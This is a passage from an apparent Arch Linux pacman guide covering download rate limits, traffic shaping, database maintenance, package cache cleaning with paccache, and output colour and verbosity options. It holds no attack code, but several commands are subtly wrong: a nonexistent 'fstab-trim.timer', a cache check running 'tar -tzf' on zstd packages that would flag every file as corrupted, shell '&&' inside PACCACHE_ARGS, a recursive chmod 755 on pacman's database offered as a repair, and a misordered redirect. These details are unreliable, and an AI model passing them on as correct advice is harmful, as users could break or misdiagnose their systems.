For a 100 Mbps connection, limit to 30% (~3.75 MB/sec):
```
XferCommand = /usr/bin/curl --limit-rate 3750K -C - -f -o %o %u
```

#### Time-Based Rate Limiting

Combine with cron or systemd timers for time-aware bandwidth management:

**Day configuration (generous):**
```
# /etc/pacman.d/pacman-day.conf
XferCommand = /usr/bin/curl --limit-rate 5M -C - -f -o %o %u
```

**Night configuration (unlimited):**
```
# /etc/pacman.d/pacman-night.conf
XferCommand = /usr/bin/curl -C - -f -o %o %u
```

Switch configurations based on time using scripts or systemd services.

### Using Wget with Rate Limiting

#### Basic Wget Configuration

```
XferCommand = /usr/bin/wget --limit-rate=500K --passive-ftp -c -O %o %u
```

**`--limit-rate=500K`:** Limits to 500 KB/sec

**Benefits of wget:**
- Simpler syntax for some users
- Well-established tool
- Good retry mechanisms

#### Advanced Wget Options

```
XferCommand = /usr/bin/wget --limit-rate=1M --timeout=60 --tries=3 --passive-ftp -c -O %o %u
```

**Combined features:**
- Rate limiting
- Timeout control
- Automatic retries

### Using Aria2c for Advanced Bandwidth Management

Aria2c provides sophisticated bandwidth control and parallel downloads:

#### Basic Aria2c Configuration

```
XferCommand = /usr/bin/aria2c --max-download-limit=500K --allow-overwrite=true --continue=true --file-allocation=none --log-level=error --max-tries=2 --max-connection-per-server=2 --min-split-size=5M --no-conf --remote-time=true --summary-interval=0 --timeout=60 --dir=/ --out=%o %u
```

**`--max-download-limit=500K`:** Global download speed limit

#### Per-File Bandwidth Limits

```
XferCommand = /usr/bin/aria2c --max-download-limit=1M --max-connection-per-server=1 --allow-overwrite=true --continue=true --dir=/ --out=%o %u
```

Limits each file to 1 MB/sec with single connection per server.

#### Schedule-Based Bandwidth

**Create time-aware script:**

```bash
#!/bin/bash
# /usr/local/bin/pacman-aria2c-adaptive

HOUR=$(date +%H)

if [ $HOUR -ge 8 ] && [ $HOUR -lt 18 ]; then
    # Daytime: 500 KB/sec limit
    LIMIT="500K"
else
    # Nighttime: 5 MB/sec limit
    LIMIT="5M"
fi

/usr/bin/aria2c --max-download-limit=$LIMIT --allow-overwrite=true --continue=true --dir=/ --out=$2 $3
```

**Make executable:**
```
sudo chmod +x /usr/local/bin/pacman-aria2c-adaptive
```

**Configure in pacman.conf:**
```
XferCommand = /usr/local/bin/pacman-aria2c-adaptive %o %u
```

### System-Wide Bandwidth Management

#### Using tc (Traffic Control)

For system-wide bandwidth shaping affecting all applications:

**Limit outbound bandwidth to 1 Mbps:**
```
sudo tc qdisc add dev eth0 root tbf rate 1mbit burst 32kbit latency 400ms
```

**Remove limit:**
```
sudo tc qdisc del dev eth0 root
```

**Note:** Replace `eth0` with your network interface (find with `ip addr`).

#### Using wondershaper

Wondershaper provides simplified bandwidth management:

**Install:**
```
sudo pacman -S wondershaper
```

**Limit interface to 1 Mbps download, 512 Kbps upload:**
```
sudo wondershaper eth0 1024 512
```

**Remove limits:**
```
sudo wondershaper clear eth0
```

**Make persistent:**
```
sudo systemctl enable wondershaper@eth0
```

### QoS and Traffic Prioritization

#### Prioritize Interactive Traffic

Use tc to deprioritize bulk downloads while maintaining responsiveness:

```bash
#!/bin/bash
# Simple QoS script
INTERFACE="eth0"

# Create root qdisc
tc qdisc add dev $INTERFACE root handle 1: htb default 12

# Create main class (10 Mbps)
tc class add dev $INTERFACE parent 1: classid 1:1 htb rate 10mbit

# High priority (interactive)
tc class add dev $INTERFACE parent 1:1 classid 1:10 htb rate 5mbit ceil 10mbit prio 1
# Low priority (bulk downloads)
tc class add dev $INTERFACE parent 1:1 classid 1:12 htb rate 3mbit ceil 8mbit prio 2

# Filter pacman traffic to low priority
tc filter add dev $INTERFACE protocol ip parent 1:0 prio 1 u32 match ip sport 80 0xffff flowid 1:12
tc filter add dev $INTERFACE protocol ip parent 1:0 prio 1 u32 match ip sport 443 0xffff flowid 1:12
```

This prioritizes interactive traffic over bulk downloads.

### Metered Connection Handling

#### Download-Only Mode

For metered connections, download packages without installing:

```
sudo pacman -Syuw
```

**Benefits:**
- Download during off-peak/unlimited hours
- Install later without bandwidth usage
- Review package sizes before downloading

#### Manual Package Selection

Download specific packages only:

```
sudo pacman -Sw package1 package2 package3
```

Install later:
```
sudo pacman -S package1 package2 package3
```

Packages install from cache without redownloading.

### Monitoring Bandwidth Usage

#### Real-Time Network Monitoring

**Using iftop:**
```
sudo pacman -S iftop
sudo iftop -i eth0
```

Shows real-time bandwidth usage per connection.

**Using nethogs:**
```
sudo pacman -S nethogs
sudo nethogs eth0
```

Shows bandwidth usage per process (including pacman).

**Using bmon:**
```
sudo pacman -S bmon
bmon
```

Graphical bandwidth monitor in terminal.

#### Check Download Progress

Pacman shows download progress with size information:

```
downloading package-1.0-1-x86_64.pkg.tar.zst...
(5/100) package-1.0-1-x86_64.pkg.tar.zst    15.2 MiB  2.45 MiB/s 00:06 [######################] 100%
```

Monitor to ensure rate limiting is working.

### Practical Bandwidth Scenarios

#### Scenario 1: Shared Home Network

Limit pacman to avoid impacting other users:

```
XferCommand = /usr/bin/curl --limit-rate 1M -C - -f -o %o %u
```

Leaves bandwidth for browsing, streaming, and gaming.

#### Scenario 2: Metered Mobile Connection

Strict bandwidth control to minimize data usage:

```
XferCommand = /usr/bin/curl --limit-rate 100K -C - -f -o %o %u
```

Very conservative for expensive mobile data.

#### Scenario 3: Daytime Office Network

Be courteous during business hours:

**Create time-based wrapper:**
```bash
#!/bin/bash
# /usr/local/bin/pacman-office-hours

HOUR=$(date +%H)
WEEKDAY=$(date +%u)  # 1-7 (Monday-Sunday)

if [ $WEEKDAY -le 5 ] && [ $HOUR -ge 9 ] && [ $HOUR -lt 17 ]; then
    # Office hours: 200 KB/sec
    RATE="200K"
else
    # After hours: 5 MB/sec
    RATE="5M"
fi

/usr/bin/curl --limit-rate $RATE -C - -f -o $1 $2
```

**Configure:**
```
XferCommand = /usr/local/bin/pacman-office-hours %o %u
```

#### Scenario 4: Server Background Updates

Minimal bandwidth for server updates during business hours:

```
XferCommand = /usr/bin/curl --limit-rate 50K -C - -f -o %o %u
```

Run updates during maintenance windows with higher limits.

#### Scenario 5: Unlimited Night Bandwidth

**Create scheduled configuration:**

```bash
#!/bin/bash
# /usr/local/bin/update-pacman-config

HOUR=$(date +%H)

if [ $HOUR -ge 1 ] && [ $HOUR -lt 7 ]; then
    # Night: unlimited
    cat > /etc/pacman.conf.d/50-xfercommand.conf << 'EOF'
[options]
XferCommand = /usr/bin/curl -C - -f -o %o %u
EOF
else
    # Day: limited
    cat > /etc/pacman.conf.d/50-xfercommand.conf << 'EOF'
[options]
XferCommand = /usr/bin/curl --limit-rate 500K -C - -f -o %o %u
EOF
fi
```

**Schedule with systemd timer to run before updates.**

### Testing Bandwidth Limits

#### Verify Rate Limiting Works

**Monitor with nethogs during pacman operation:**

Terminal 1:
```
sudo nethogs eth0
```

Terminal 2:
```
sudo pacman -Syu
```

Observe pacman's bandwidth usage matches your limit.

#### Measure Actual Download Speed

**Time a known package download:**
```
time sudo pacman -Sw firefox
```

Calculate speed from package size and time taken.

### Best Practices

**Set realistic limits:** Don't set limits so low that updates become impractical.

**Consider parallel downloads:** If using `ParallelDownloads`, remember the rate limit applies per connection, not globally.

**Monitor and adjust:** Test bandwidth limits and adjust based on actual network impact.

**Document settings:** Comment your XferCommand explaining the rate limit choice.

**Be network-friendly:** On shared networks, limit bandwidth during peak hours.

**Use adaptive limits:** Implement time-based limits if your usage patterns vary.

**Balance speed and courtesy:** Find a balance between update speed and network impact.

**Test before committing:** Verify bandwidth limits work as expected before relying on them.

**Consider caching:** For multiple systems, use a local mirror to reduce external bandwidth.

**Plan large updates:** Schedule major system upgrades during off-peak or unlimited periods.

Effective bandwidth management ensures package operations don't negatively impact other network activities while still maintaining reasonable update times.


# Speed Optimization

## Database Optimization

### Overview

Pacman's database stores information about installed packages, available packages, and file lists. Over time, the database can become fragmented or contain obsolete data. Regular optimization improves pacman's performance, reduces disk space usage, and maintains database integrity.

### Database Locations

#### Local Package Database

Contains information about installed packages:

```
/var/lib/pacman/local/
```

**Structure:**
```
/var/lib/pacman/local/
├── package-name-version/
│   ├── desc          # Package description
│   ├── files         # Installed files list
│   └── mtree         # File integrity data
└── ALPM_DB_VERSION   # Database version
```

#### Sync Databases

Contains information about repository packages:

```
/var/lib/pacman/sync/
```

**Files:**
```
/var/lib/pacman/sync/
├── core.db
├── extra.db
└── multilib.db
```

These are symlinks to versioned database files downloaded from mirrors.

### Database Size Analysis

#### Check Database Size

**Local database:**
```
du -sh /var/lib/pacman/local/
```

Typical size: 30-100 MB depending on installed packages.

**Sync databases:**
```
du -sh /var/lib/pacman/sync/
```

Typical size: 10-50 MB.

**Total database size:**
```
du -sh /var/lib/pacman/
```

#### Identify Large Package Entries

```
du -sh /var/lib/pacman/local/* | sort -h | tail -20
```

Shows the 20 largest package database entries.

### Optimizing the Local Database

#### Remove Orphaned Package Data

Sometimes package database entries remain after improper removal:

**Identify orphaned directories:**
```
for dir in /var/lib/pacman/local/*/; do
    pkg=$(basename "$dir")
    if ! pacman -Qq | grep -q "^${pkg%-*-*}$"; then
        echo "Orphaned: $pkg"
    fi
done
```

**Manual cleanup (use with extreme caution):**
```
sudo rm -rf /var/lib/pacman/local/orphaned-package-version/
```

**Warning:** Only remove confirmed orphaned entries; incorrect removal can break pacman.

#### Rebuild Database from Scratch

If the database is corrupted or severely fragmented:

**List all installed packages:**
```
pacman -Qq > /tmp/installed-packages.txt
```

**Reinstall all packages (rebuilds database):**
```
sudo pacman -S $(cat /tmp/installed-packages.txt) --overwrite '*'
```

**Warning:** This is time-consuming and should only be done if database corruption is severe.

### Optimizing Sync Databases

#### Clean Unused Repository Databases

Remove databases for disabled repositories:

```
sudo pacman -Sc
```

Prompts to remove unused repository databases.

**Force removal:**
```
sudo rm /var/lib/pacman/sync/unused-repo.db*
```

Only remove if you're certain the repository is no longer used.

#### Refresh Databases

Ensure databases are current and not corrupted:

**Standard refresh:**
```
sudo pacman -Sy
```

**Force complete refresh:**
```
sudo pacman -Syy
```

The double `-yy` re-downloads all databases, replacing potentially corrupted files.

### Database Integrity Verification

#### Check Database Consistency

Verify the integrity of the local package database:

```
sudo pacman -Dk
```

Reports missing or corrupted database entries.

#### Verify Package Files

Check if installed files match database records:

```
pacman -Qk
```

Basic file presence check.

```
pacman -Qkk
```

Thorough integrity check including file attributes.

#### Advanced Verification with paccheck

Install `pacutils`:
```
sudo pacman -S pacutils
```

**Comprehensive integrity check:**
```
paccheck --md5sum --sha256sum --file-properties --quiet
```

Reports packages with integrity issues.

### Database Upgrade

#### Upgrade Database Format

When pacman updates introduce new database formats:

```
sudo pacman-db-upgrade
```

This updates the local database structure to match the current pacman version.

**When to use:**
- After major pacman upgrades
- If database version mismatches occur
- Database initialization errors

#### Automatic Upgrade

Pacman typically handles database upgrades automatically during installation or system updates. Manual intervention is rarely needed.

### Optimizing Database Performance

#### Filesystem Considerations

**Use appropriate filesystem:** ext4, btrfs, and XFS all perform well with pacman databases.

**Enable compression (btrfs):**
```
sudo btrfs property set /var/lib/pacman/ compression zstd
```

Reduces database storage size.

**Disable access time updates:**

Add to `/etc/fstab`:
```
/dev/sdXn  /  ext4  defaults,noatime  0  1
```

Reduces unnecessary disk writes during database operations.

#### SSD Optimization

For SSD systems:

**Enable TRIM:**
```
sudo systemctl enable fstab-trim.timer
```

**Verify TRIM support:**
```
sudo fstrim -v /
```

Regular TRIM operations improve SSD performance, benefiting database operations.

### Cleaning Database-Related Files

#### Remove .SRCINFO Files

Build directories sometimes leave source info files:

```
find ~/.cache/yay ~/.cache/paru -name ".SRCINFO" -delete
```

Cleans AUR helper build caches.

#### Clean Old Database Locks

Stale lock files can accumulate:

**Check for lock file:**
```
ls -la /var/lib/pacman/db.lck
```

**Remove if pacman isn't running:**
```
sudo rm /var/lib/pacman/db.lck
```

**Warning:** Only remove if you're certain pacman isn't running.

### Optimizing Files Database

#### Files Database Location

```
/var/lib/pacman/sync/*.files
```

Contains comprehensive file listings for repository packages.

#### Refresh Files Database

Update the files database:

```
sudo pacman -Fy
```

This synchronizes the files database, enabling file searches with `pacman -F`.

#### Automate Files Database Updates

Enable automatic weekly updates:

```
sudo systemctl enable --now pacman-filesdb-refresh.timer
```

Keeps the files database current for accurate file queries.

#### Clean Outdated Files Databases

Remove files databases for disabled repositories:

```
sudo rm /var/lib/pacman/sync/unused-repo.files*
```

### Monitoring Database Performance

#### Measure Query Performance

**Time package queries:**
```
time pacman -Ss firefox
time pacman -Qi firefox
time pacman -Ql firefox
```

Compare times before and after optimization.

#### Database Size Trends

Track database growth over time:

```bash
#!/bin/bash
# /usr/local/bin/track-pacman-db-size

DATE=$(date +%Y-%m-%d)
SIZE=$(du -sb /var/lib/pacman/ | cut -f1)

echo "$DATE,$SIZE" >> /var/log/pacman-db-size.log
```

Schedule with cron to monitor long-term trends.

### Automation and Maintenance

#### Automatic Database Maintenance Script

Create a comprehensive maintenance script:

```bash
#!/bin/bash
# /usr/local/bin/pacman-db-optimize

echo "Starting pacman database optimization..."

# Refresh databases
echo "Refreshing sync databases..."
pacman -Sy

# Remove unused databases
echo "Cleaning unused databases..."
pacman -Sc --noconfirm

# Verify database integrity
echo "Verifying database integrity..."
pacman -Dk

# Update files database
echo "Updating files database..."
pacman -Fy

# Report final size
echo "Database size:"
du -sh /var/lib/pacman/

echo "Optimization complete!"
```

**Make executable:**
```
sudo chmod +x /usr/local/bin/pacman-db-optimize
```

**Run monthly:**
```
sudo crontab -e
```

Add:
```
0 3 1 * * /usr/local/bin/pacman-db-optimize
```

#### Pacman Hook for Database Optimization

Automatically optimize after major operations:

```
# /etc/pacman.d/hooks/database-optimize.hook
[Trigger]
Operation = Upgrade
Operation = Install
Operation = Remove
Type = Package
Target = *

[Action]
Description = Optimizing package database...
When = PostTransaction
Exec = /bin/sh -c "pacman -Dk && pacman -Sc --noconfirm"
```

**Warning:** This runs after every transaction; may slow down frequent operations.

### Troubleshooting Database Issues

#### Database Corruption

**Symptoms:**
```
error: could not open file /var/lib/pacman/local/package-name/desc
error: failed to prepare transaction (database is not valid)
```

**Solutions:**

**1. Verify and fix permissions:**
```
sudo chown -R root:root /var/lib/pacman/
sudo chmod -R 755 /var/lib/pacman/
```

**2. Reinstall affected package:**
```
sudo pacman -S package-name --overwrite '*'
```

**3. Rebuild database for package:**
```
sudo pacman -S --dbonly package-name
```

**4. Complete database rebuild (last resort):**
```
sudo pacman -S $(pacman -Qq) --overwrite '*'
```

#### Slow Database Operations

**Symptoms:**
- Package queries take excessive time
- Installation/removal operations lag

**Solutions:**

**1. Check disk I/O:**
```
sudo iotop
```

**2. Verify filesystem health:**
```
sudo fsck /dev/sdXn  # Unmounted partition only
```

**3. Optimize filesystem:**
```
sudo e4defrag /var/lib/pacman/  # For ext4
```

**4. Consider SSD upgrade:** Database operations benefit significantly from SSD performance.

### Best Practices

**Regular refreshes:** Run `pacman -Sy` regularly to keep sync databases current.

**Periodic verification:** Check database integrity monthly with `pacman -Dk`.

**Clean orphaned ** Remove orphaned package entries cautiously.

**Monitor size growth:** Track database size to identify unusual growth.

**Maintain backups:** Include `/var/lib/pacman/` in system backups.

**Use SSD when possible:** Database operations benefit from fast storage.

**Avoid manual modifications:** Don't manually edit database files; use pacman commands.

**Update files database:** Keep files database current with `pacman -Fy`.

**Clean unused repositories:** Remove databases for disabled repos.

**Automate maintenance:** Use hooks or cron for regular optimization.

Proper database optimization ensures pacman operates efficiently, with fast queries and reliable package management operations.

## Cache Strategies

### Overview

Pacman's package cache stores downloaded package files, enabling offline reinstallation, quick downgrades, and recovery without re-downloading. Effective cache strategies balance disk space usage against the benefits of retained packages.

### Cache Location and Structure

#### Default Cache Directory

```
/var/cache/pacman/pkg/
```

All downloaded packages are stored here by default.

#### Cache File Format

Package files use the naming convention:

```
package-name-version-release-architecture.pkg.tar.zst
```

**Examples:**
```
firefox-120.0-1-x86_64.pkg.tar.zst
linux-6.6.1.arch1-1-x86_64.pkg.tar.zst
glibc-2.38-1-x86_64.pkg.tar.zst
```

### Cache Size Management

#### Check Cache Size

View total cache size:

```
du -sh /var/cache/pacman/pkg/
```

Typical sizes range from 5-50 GB depending on system age and cleaning frequency.

#### Count Cached Packages

Count package files:

```
ls /var/cache/pacman/pkg/ | wc -l
```

Shows total number of cached package files.

#### Identify Largest Cached Packages

Find packages consuming the most space:

```
du -h /var/cache/pacman/pkg/* | sort -rh | head -20
```

Shows the 20 largest cached packages.

### Manual Cache Cleaning

#### Using Pacman

**Remove uninstalled packages from cache:**
```
sudo pacman -Sc
```

Removes all cached packages not currently installed. Keeps only packages currently on your system.

**Remove all cached packages:**
```
sudo pacman -Scc
```

Empties the entire cache, removing all package files including currently installed versions.

**Warning:** After `-Scc`, you cannot downgrade or reinstall offline.

### Intelligent Cache Cleaning with Paccache

#### Installing paccache

Paccache is part of `pacman-contrib`:

```
sudo pacman -S pacman-contrib
```

#### Basic Paccache Usage

**Keep 3 most recent versions (default):**
```
sudo paccache -r
```

Removes all cached versions except the three most recent for each package.

**Keep 1 version:**
```
sudo paccache -rk1
```

Keeps only the most recent version of each installed package.

**Keep 2 versions:**
```
sudo paccache -rk2
```

**Keep 5 versions:**
```
sudo paccache -rk5
```

#### Target Uninstalled Packages

**Remove all uninstalled package versions:**
```
sudo paccache -ruk0
```

The `-u` flag targets uninstalled packages; `-k0` keeps zero versions (removes all).

**Keep 1 version of uninstalled packages:**
```
sudo paccache -ruk1
```

Preserves one version of previously installed packages for easy reinstallation.

#### Dry Run Mode

Preview what would be removed without deleting:

```
paccache -dk3
```

Shows files that would be removed when keeping 3 versions.

#### Verbose Output

See detailed information about removed packages:

```
sudo paccache -rvk2
```

Displays each package file as it's removed.

### Cache Retention Strategies

#### Conservative Strategy (3-5 versions)

**Rationale:** Provides multiple downgrade options while managing space reasonably.

```
sudo paccache -rk3
```

**Benefits:**
- Multiple downgrade points
- Good balance of space and utility
- Handles most package issues

**When to use:** Default for most users; good general-purpose strategy.

#### Minimal Strategy (1 version)

**Rationale:** Keeps only the current version, maximizing space savings.

```
sudo paccache -rk1
```

**Benefits:**
- Minimal disk space usage
- Fast cache operations
- Still allows offline reinstall

**When to use:** Limited disk space; regular updates; rarely downgrade.

#### Aggressive Uninstalled Cleanup

**Rationale:** Remove all uninstalled packages but keep multiple versions of installed.

```
sudo paccache -ruk0 && sudo paccache -rk3
```

**Benefits:**
- Removes packages you don't use
- Retains history for current packages
- Significant space savings

**When to use:** Standard recommendation for most users.

#### Archival Strategy (unlimited versions)

**Rationale:** Never remove packages; maintain complete history.

```
# Don't run paccache; keep everything
```

**Benefits:**
- Complete downgrade history
- Maximum recovery options
- Useful for testing/development

**When to use:** Ample disk space; frequent testing; package development.

### Automated Cache Cleaning

#### Systemd Timer (Recommended)

Enable automatic weekly cache cleaning:

```
sudo systemctl enable --now paccache.timer
```

**Default behavior:** Runs `paccache -r` weekly, keeping 3 versions.

#### Configure Timer Behavior

Edit the timer arguments:

```
sudo nano /etc/conf.d/pacman-contrib
```

**Example configurations:**

**Keep only 1 version:**
```
PACCACHE_ARGS='-k1'
```

**Remove uninstalled packages:**
```
PACCACHE_ARGS='-uk0'
```

**Combined strategy:**
```
PACCACHE_ARGS='-rk2 && paccache -ruk0'
```

**Restart timer after changes:**
```
sudo systemctl restart paccache.timer
```

#### Check Timer Status

View timer schedule and last run:

```
systemctl status paccache.timer
systemctl list-timers paccache.timer
```

#### Pacman Hook for Cache Cleaning

Automatically clean cache after package operations:

```
# /etc/pacman.d/hooks/clean-cache.hook
[Trigger]
Operation = Upgrade
Operation = Install
Operation = Remove
Type = Package
Target = *

[Action]
Description = Cleaning package cache...
When = PostTransaction
Exec = /usr/bin/paccache -rk2
```

**Benefits:**
- Automatic maintenance
- No manual intervention
- Always clean cache

**Drawback:** Runs after every operation; may slow frequent updates.

### Multiple Cache Directories

#### Configure Additional Cache Locations

In `/etc/pacman.conf`:

```
[options]
CacheDir = /var/cache/pacman/pkg/
CacheDir = /mnt/external/cache/
```

Pacman searches both directories for cached packages.

#### Use Cases

**External storage:** Use large external drive for primary cache:
```
CacheDir = /mnt/external/cache/
CacheDir = /var/cache/pacman/pkg/
```

**Network cache:** Shared cache for multiple systems:
```
CacheDir = /mnt/nfs-share/arch-cache/
CacheDir = /var/cache/pacman/pkg/
```

#### Clean Multiple Cache Directories

Paccache supports multiple directories:

```
sudo paccache -rk3 --cachedir /var/cache/pacman/pkg/ --cachedir /mnt/external/cache/
```

### Archive and Backup Strategies

#### Move Old Packages to Archive

Instead of deleting, archive old packages:

```
sudo mkdir -p /var/cache/pacman/archive/
sudo paccache -m /var/cache/pacman/archive/ -rk1
```

The `-m` flag moves packages to the specified directory instead of deleting.

**Benefits:**
- Preserves old packages
- Clears active cache
- Allows later recovery

#### Selective Archival

**Archive only specific packages:**
```bash
#!/bin/bash
# Archive important packages before cleaning

mkdir -p /backup/important-packages/

for pkg in linux firefox chromium; do
    cp /var/cache/pacman/pkg/${pkg}-*.pkg.tar.zst /backup/important-packages/ 2>/dev/null
done

sudo paccache -rk1
```

### Local Repository from Cache

#### Create Local Repository

Use cache as a local repository for offline installs:

**Create repository database:**
```
cd /var/cache/pacman/pkg/
repo-add /var/cache/pacman/pkg/custom.db.tar.gz *.pkg.tar.zst
```

**Add to `/etc/pacman.conf`:**
```
[custom]
SigLevel = Optional TrustAll
Server = file:///var/cache/pacman/pkg
```

**Synchronize:**
```
sudo pacman -Sy
```

Now packages in cache are available as a repository.

### Cache Sharing Between Systems

#### Network Cache Setup

Share cache across multiple systems:

**Server side (NFS example):**
```
# /etc/exports
/var/cache/pacman/pkg 192.168.1.0/24(ro,sync,no_subtree_check)
```

**Client side:**
```
# Mount shared cache
sudo mount server:/var/cache/pacman/pkg /mnt/shared-cache

# Configure pacman
CacheDir = /mnt/shared-cache
CacheDir = /var/cache/pacman/pkg
```

**Benefits:**
- Reduces redundant downloads
- Saves bandwidth
- Faster updates across network

### Monitoring and Maintenance

#### Cache Growth Tracking

Track cache size over time:

```bash
#!/bin/bash
# /usr/local/bin/track-cache-size

DATE=$(date +%Y-%m-%d)
SIZE=$(du -sb /var/cache/pacman/pkg/ | cut -f1)
COUNT=$(ls /var/cache/pacman/pkg/ | wc -l)

echo "$DATE,$SIZE,$COUNT" >> /var/log/pacman-cache-stats.log
```

**Schedule with cron:**
```
0 0 * * * /usr/local/bin/track-cache-size
```

#### Cache Health Check

Verify cache integrity:

```bash
#!/bin/bash
# Check for corrupted packages in cache

for pkg in /var/cache/pacman/pkg/*.pkg.tar.zst; do
    if ! tar -tzf "$pkg" &>/dev/null; then
        echo "Corrupted: $pkg"
    fi
done
```

Remove corrupted packages:
```
sudo rm /var/cache/pacman/pkg/corrupted-package.pkg.tar.zst
```

### Best Practices

**Regular cleaning:** Clean cache monthly or quarterly depending on disk space.

**Balanced retention:** Keep 2-3 versions for downgrade capability.

**Automate maintenance:** Use paccache.timer for hands-off management.

**Remove uninstalled aggressively:** Uninstalled packages rarely need retention.

**Monitor space usage:** Track cache growth to adjust strategy.

**Consider SSD space:** SSDs may warrant more aggressive cleaning.

**Archive critical packages:** Backup important package versions before cleaning.

**Clean before major upgrades:** Free space before large system updates.

**Document strategy:** Record retention policy for consistency.

**Test downgrade needs:** Adjust retention based on actual downgrade frequency.

### Example Cache Management Scripts

#### Comprehensive Cleanup Script

```bash
#!/bin/bash
# /usr/local/bin/cache-cleanup

echo "Starting cache cleanup..."

# Remove uninstalled packages
echo "Removing uninstalled packages..."
paccache -ruk0

# Keep 2 versions of installed
echo "Keeping 2 versions of installed packages..."
paccache -rk2

# Report results
echo "Cache size: $(du -sh /var/cache/pacman/pkg/ | cut -f1)"
echo "Package count: $(ls /var/cache/pacman/pkg/ | wc -l)"

echo "Cleanup complete!"
```

#### Conditional Cleanup Based on Space

```bash
#!/bin/bash
# Clean cache if below 5GB free space

FREE_SPACE=$(df /var/cache/pacman/pkg/ | tail -1 | awk '{print $4}')
THRESHOLD=$((5 * 1024 * 1024))  # 5GB in KB

if [ $FREE_SPACE -lt $THRESHOLD ]; then
    echo "Low disk space detected. Cleaning cache..."
    paccache -ruk0
    paccache -rk1
else
    echo "Sufficient disk space. Keeping cache."
fi
```

Effective cache strategies ensure optimal disk space usage while maintaining the ability to downgrade, reinstall offline, and recover from issues.

## Color and Verbosity Settings

### Overview

Pacman supports colored output and various verbosity levels to enhance readability and provide different amounts of information during package operations. These settings can be configured in `/etc/pacman.conf` or via command-line options.

### Color Configuration

#### Enabling Color in pacman.conf

Edit the configuration file:

```
sudo nano /etc/pacman.conf
```

Uncomment or add in the `[options]` section:

```
[options]
Color
```

This enables colored output for all pacman operations.

#### Color Behavior

**Enabled (Color directive present):**
- Package names: Bold white
- Repository names: Bold magenta
- Versions: Green
- Warnings: Yellow
- Errors: Red/Bold red
- Progress bars: Colored based on status

**Disabled (default if not specified):**
- All output in standard terminal colors
- No syntax highlighting
- Plain text progress indicators

#### Command-Line Color Control

**Force colors on:**
```
pacman --color always
```

Enables colors even when output is not a TTY (e.g., piped to files).

**Disable colors:**
```
pacman --color never
```

Disables colors even when Color is set in pacman.conf.

**Auto-detect (default):**
```
pacman --color auto
```

Enables colors only when output is a terminal (TTY).

### Practical Color Examples

#### Enable Color Temporarily

**Single operation with colors:**
```
sudo pacman --color always -Syu
```

**Search with colors:**
```
pacman --color always -Ss firefox
```

#### Disable Color for Scripting

**Log output without color codes:**
```
pacman --color never -Syu 2>&1 | tee pacman-update.log
```

This prevents ANSI color codes from cluttering log files.

#### Permanent Color Settings

**Always use colors (recommended):**
```
# /etc/pacman.conf
[options]
Color
```

**Never use colors (for compatibility):**
Remove or comment out the Color directive:
```
#Color
```

### Verbosity Settings

#### Default Verbosity

Standard pacman output includes:
- Operation descriptions
- Package lists with versions
- Download progress
- Installation/removal confirmations
- Basic warnings and errors

#### Verbose Mode (-v)

**Enable verbose output:**
```
pacman -v
```

**Output includes:**
- All paths and configuration
- Database locations
- Cache directories
- Repository URLs
- Detailed version information
- Full configuration dump

**Example usage:**
```
pacman -v
```

**Sample output:**
```
Database Path : /var/lib/pacman/
Cache Dirs    : /var/cache/pacman/pkg/
Lock File     : /var/lib/pacman/db.lck
Log File      : /var/log/pacman.log
GPG Dir       : /etc/pacman.d/gnupg/
Targets       : None
```

Useful for diagnostics and verifying configuration.

#### Debug Mode (--debug)

**Enable debug output:**
```
pacman --debug
```

**Output includes:**
- All verbose information
- Function calls
- Database queries
- Hook execution details
- Detailed error information
- Internal operation logging

**Example usage:**
```
sudo pacman -S firefox --debug 2>&1 | less
```

**Use cases:**
- Troubleshooting installation failures
- Understanding hook execution
- Investigating database issues
- Reporting bugs to developers

### Quiet Mode

#### Reducing Output (-q)

**Single -q flag:**
```
pacman -Qq
```

Shows minimal output, typically just package names without versions.

**Example - List installed packages (quiet):**
```
pacman -Qq
```

**Output:**
```
bash
coreutils
filesystem
glibc
...
```

Compared to standard `pacman -Q`:
```
bash 5.2.015-1
coreutils 9.4-1
filesystem 2023.10.31-1
glibc 2.38-7
...
```

#### Double Quiet (-qq)

**Extra quiet mode:**
```
pacman -Qqq
```

Provides absolute minimal output, often suppressing even warnings.

**Use case:** Scripting where you need clean, parseable output.

### VerbosePkgLists Option

#### Detailed Package Lists

Enable detailed package listings in `/etc/pacman.conf`:

```
[options]
VerbosePkgLists
```

**Effect:** Package lists include name, version, and size information.

**Without VerbosePkgLists:**
```
Packages (5): firefox chromium vlc gimp inkscape
```

**With VerbosePkgLists:**
```
Packages (5):

Name               Old Version   New Version   Net Change  Download Size

firefox            119.0-1       120.0-1       0.50 MiB       55.2 MiB
chromium          119.0-1       120.0-1       1.20 MiB      110.5 MiB
vlc                3.0.18-1      3.0.19-1      0.10 MiB       15.3 MiB
gimp               2.10.34-1     2.10.35-1     0.05 MiB       20.1 MiB
inkscape           1.3-1         1.3.1-1       0.15 MiB       30.4 MiB

Total Download Size:   231.5 MiB
Total Installed Size:  1245.2 MiB
Net Upgrade Size:        2.0 MiB
```

**Benefits:**
- Clear size information before download
- Version changes visible
- Helps decide whether to proceed

### NoProgressBar Option

#### Disable Progress Bars

In `/etc/pacman.conf`:

```
[options]
NoProgressBar
```

**Effect:** Disables animated progress bars during downloads and installations.

**Use cases:**
- Terminal emulators with poor progress bar support
- Logging operations to files
- Remote sessions over slow connections
- Scripted operations

**Without NoProgressBar:**
```
downloading firefox-120.0-1-x86_64.pkg.tar.zst...
[######################] 100%
```

**With NoProgressBar:**
```
downloading firefox-120.0-1-x86_64.pkg.tar.zst... done
```

### Command-Line Verbosity Control

#### --noprogressbar Flag

Disable progress bar for single operation:

```
sudo pacman -Syu --noprogressbar
```

Overrides configuration file setting.

#### Combining Flags

**Verbose + No colors:**
```
pacman -v --color never
```

**Quiet + Colors (for scripts parsing colored output):**
```
pacman -Qq --color always
```

**Debug + No progress bar:**
```
sudo pacman -S package --debug --noprogressbar 2>&1 | tee debug.log
```

### Output Redirection and Logging

#### Capture All Output

**Standard and error output to file:**
```
sudo pacman -Syu 2>&1 | tee pacman-update.log
```

**Suppress colors in logs:**
```
sudo pacman --color never -Syu 2>&1 | tee pacman-update.log
```

**Debug output to file:**
```
sudo pacman -S package --debug 2>&1 > debug.log
```

#### Separate Error Stream

**Only errors to file:**
```
sudo pacman -Syu 2> errors.log
```

**Standard output to terminal, errors to file:**
```
sudo pacman -Syu 2> errors.log
```

### Practical Configuration Examples

#### Minimal/Clean Output

**For scripting or automation:**

```
# /etc/pacman.conf
[options]
#Color
NoProgressBar
```

**Usage:**
```
pacman -Qq | wc -l  # Clean count of installed packages
```

#### Maximum Information

**For troubleshooting and development:**

```
# /etc/pacman.conf
[options]
Color
VerbosePkgLists
```

**Usage:**
```
